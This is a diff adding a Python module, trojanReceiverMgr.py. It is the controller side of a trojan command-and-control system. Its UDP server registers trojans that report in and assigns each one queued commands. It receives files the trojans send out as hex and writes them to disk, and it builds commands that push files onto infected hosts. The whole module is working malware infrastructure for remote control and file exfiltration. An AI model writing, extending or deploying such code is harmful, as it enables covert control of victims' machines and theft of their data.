@@ -1,0 +1,158 @@
+#!/usr/bin/python
+#-----------------------------------------------------------------------------
+# Name:        trojanReceiverMgr.py
+#
+# Purpose:     The trojans manager module running in a sub-thread parallel with 
+#              the controller hub main UI to handle the trojan registration and 
+#              assign the user's configured task to the related trojan.
+# 
+# Author:      Yuancheng Liu
+#
+# Created:     2023/10/26
+# Version:     v0.1.2
+# Copyright:   Copyright (c) 2023 LiuYuancheng
+# License:     MIT License  
+#-----------------------------------------------------------------------------
+import os
+import threading
+import udpCom
+
+import trojanReceiverGlobal as gv
+
+#-----------------------------------------------------------------------------
+#-----------------------------------------------------------------------------
+class trojanReceiverMgr(threading.Thread):
+    
+    def __init__(self, parent) -> None:
+        threading.Thread.__init__(self)
+        self.parent = parent
+        # Init the task which will assign to the trojan (next report)
+        self.nextExeDict ={
+            'id'    : None,
+            'type'  : None,
+            'action': None,
+            'filePath': None, 
+        }
+        self.lastTask = None
+        self.server = udpCom.udpServer(None, gv.UDP_PORT)
+        self.server.setBufferSize(bufferSize=gv.BUF_SZ)
+
+    #-----------------------------------------------------------------------------
+    def run(self):
+        print("Start the trojanReceiverMgr.")
+        if gv.DEBUG_FLG: print("Start the UDP echo server listening port [%s]" % str(gv.UDP_PORT))
+        self.server.serverStart(handler=self.cmdHandler)
+
+    #-----------------------------------------------------------------------------
+    def cmdHandler(self, msg):
+        """ The trojan report handler method passed into the UDP server to handle the 
+            incoming messages.
+        """
+        if isinstance(msg, bytes): msg = msg.decode('utf-8')
+        if msg == '': return None
+        if gv.iMainFrame and self.lastTask==None: 
+            gv.iMainFrame.updateTFDetail("Incoming message: %s" % str(msg))
+        # Reply trojan connection accept
+        result = 'CON;accept;ready'
+        if msg == 'Err:Not support action.': return result
+
+        reqKey, reqType, data = self.parseIncomeMsg(msg)
+        if reqKey == 'RPT':
+            # add the new report trojan to the trojan list.
+            if gv.iMainFrame: gv.iMainFrame.setTrojanList(int(data))
+
+            if self.nextExeDict['id'] and \
+                int(data) == int(self.nextExeDict['id']) and \
+                self.nextExeDict['action']:
+                result = self.nextExeDict['action']
+                # clear the execution cash
+                #self.nextExeDict ={
+                #    'id': None,
+                #    'action': None
+                #}
+                self.nextExeDict['id'] = None 
+                self.nextExeDict['action'] = None  
+
+        elif reqKey == 'FIO':
+            print("ready save the file.")
+            if reqType == 'out' and self.nextExeDict['type'] == 'FIO':
+                try:
+                    filepath = self.nextExeDict['filePath']
+                    print("save file to %s" %str(filepath))
+                    localFilePath = os.path.join(gv.dirpath, os.path.basename(filepath))
+                    fileBytes = bytes.fromhex(data)
+                    with open(localFilePath, 'wb') as fh:
+                        fh.write(fileBytes)
+                    self.nextExeDict['type'] = None 
+                    self.nextExeDict['filePath'] = None  
+                except Exception as err:
+                    print("file create error : %s" %str(err))
+
+        return result
+
+    #-----------------------------------------------------------------------------
+    def setNextExeDict(self, trojanID, actType, actionData, filePath=None):
+        """ set the assigned task in the next execution dict."""
+        self.nextExeDict = {
+            'id': int(trojanID),
+            'type': actType,
+            'action': actionData,
+            'filePath': filePath
+        }
+
+    #-----------------------------------------------------------------------------
+    def getInjectFileCmd(self, filepath):
+        filename = os.path.basename(filepath)
+        fileData = b'error'
+        with open(filepath, 'rb') as fh:
+            fileData = fh.read()
+            dataStr = fileData.hex()
+        cmd = 'FIO;'+filename+';'+dataStr
+        return cmd
+
+    #-----------------------------------------------------------------------------
+    def parseIncomeMsg(self, msg):
+        """ Split the trojan connection's control cmd to:
+            - reqKey: request key which identify the action category.
+            - reqType: request type which detail action type.
+            - reqData: request data which will be used in the action.
+        """
+        reqKey = reqType = reqData = None
+        try:
+            if isinstance(msg, bytes): msg = msg.decode(gv.STR_DECODE)
+            reqKey, reqType, reqData = msg.split(';', 2)
+            return (reqKey.strip(), reqType.strip(), reqData)
+        except Exception as err:
+            print('The incoming message format is incorrect, ignore it.')
+            if gv.DEBUG_FLG: print(err)
+            return (reqKey, reqType, reqData)
+        
+    #-----------------------------------------------------------------------------
+    def base64Convert(self, data, b64Encode=True):
+        """ Encode/decode a str to its base-64 string format.
+        Args:
+            messageStr (str): can be either base-64 message or plain text message.
+            b64Encode (bool): whether the input is to be encoded to base-64, default True.
+        Returns:
+            string: base-64 message if b64Encode is True; else plain text message.
+        """
+        import base64
+        if b64Encode:
+            message_bytes = data.encode('ascii')
+            base64_bytes = base64.b64encode(message_bytes)
+            base64_message = base64_bytes.decode('ascii')
+            return base64_message
+        else:
+            base64_bytes = data.encode('ascii')
+            message_bytes = base64.b64decode(base64_bytes)
+            message = message_bytes.decode('ascii')
+            return message
+
+    #-----------------------------------------------------------------------------
+    def stop(self):
+        """ Stop the thread."""
+        self.terminate = True
+        if self.server: self.server.serverStop()
+        endClient = udpCom.udpClient(('127.0.0.1', gv.UDP_PORT))
+        endClient.disconnect()
+        endClient = None
